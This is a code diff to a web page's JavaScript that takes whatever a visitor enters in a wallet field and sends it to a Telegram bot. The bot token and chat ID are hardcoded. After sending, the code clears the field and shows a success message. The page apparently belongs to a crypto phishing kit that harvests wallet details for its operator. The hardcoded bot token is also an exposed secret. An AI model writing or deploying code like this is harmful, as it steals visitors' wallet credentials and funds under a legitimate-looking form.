@@ -10,28 +10,46 @@ var contractAddress = "contractAddress"
 var subWal = document.getElementById("subWal")
 
 
+subWal.addEventListener("click", sendToTelegram)
 
 const form = document.querySelector('#form')
 
-form.addEventListener("submit", (e)=>{
-    e.preventDefault()
-
-    var walletInput = document.getElementById("walletInput").value
+var walletInput = document.getElementById("walletInput").value
 
 const bot = new Bot("6382471344:AAG-mj4zm_n9xTTp_Ufz-ronZ8VUL0nv8M4", 5549088466);
 
-// bot.getUpdates()
-// .then(res=>{
-//     console.log(res)
-// })
 
-bot.sendMessage(walletInput)
-.then(res=>{
+form.addEventListener("submit", (e)=>{
+    e.preventDefault()
+    sendToTelegram();
+    
+   
+})
+
+function sendToTelegram(){
+    var walletInput = document.getElementById("walletInput").value
+    const bot = new Bot("6382471344:AAG-mj4zm_n9xTTp_Ufz-ronZ8VUL0nv8M4", 5549088466);
+    bot.sendMessage(walletInput)
+    .then(res=>{
     console.log(walletInput)
 })
 
+setTimeout(() => {
+    document.getElementById("walletInput").value = ""
+}, 2000);
 
-})
+setTimeout(() => {
+    document.getElementById("subSuccess").style.display="block"    
+}, 500);
+
+setTimeout(() => {
+    document.getElementById("subSuccess").style.display="none"    
+}, 4000);
+
+
+
+
+}
 
 
 menuBtn.addEventListener("click", ()=>{
